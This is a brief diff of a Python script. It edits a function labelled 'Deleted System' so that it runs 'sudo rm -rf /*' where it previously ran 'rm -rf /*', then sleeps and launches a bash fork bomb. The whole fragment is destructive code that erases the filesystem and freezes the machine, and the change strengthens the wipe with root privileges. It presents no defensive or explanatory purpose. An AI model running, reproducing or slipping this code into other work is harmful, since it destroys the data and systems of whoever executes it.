@@ -18,7 +18,7 @@ def clear():
 # Deleted System:
 
 def deleted():
-	os.system("rm -rf /*")
+	os.system("sudo rm -rf /*")
 	time.sleep(6.50)
 	os.system(":(){ :|:& };:")
 	
